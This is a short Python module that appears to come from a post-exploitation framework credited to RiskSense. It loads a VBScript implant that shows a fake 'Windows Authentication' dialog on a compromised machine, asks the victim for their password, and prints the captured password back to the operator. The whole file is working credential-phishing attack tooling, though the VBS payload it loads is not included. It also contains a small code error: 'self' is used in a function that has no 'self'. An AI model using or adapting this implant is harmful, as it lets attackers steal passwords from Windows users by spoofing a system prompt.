from core.job import Job

AUTHORS = ['RiskSense, Inc.']

OPTIONS = {
    'MESSAGE': [True, 'You must enter your password to continue...', 'password phishing text'],
    'TITLE': [True, 'Windows Authentication', 'password phishing text']
}

def on_postwork_callback(job):
    self.shell.print_good("Password was: ", job.data)


class PasswordJob(Job):
    def on_view(self):
        pass

def run(shell):
    with open("data/vbs/implant_phish_password_box.vbs", "rb") as f:
        script = f.read()

    script = script.replace(b"~MESSAGE~", shell.get_option("MESSAGE").encode())

    shell.create_job(script, PasswordJob)
    #shell.create_job(data, on_postwork_callback)
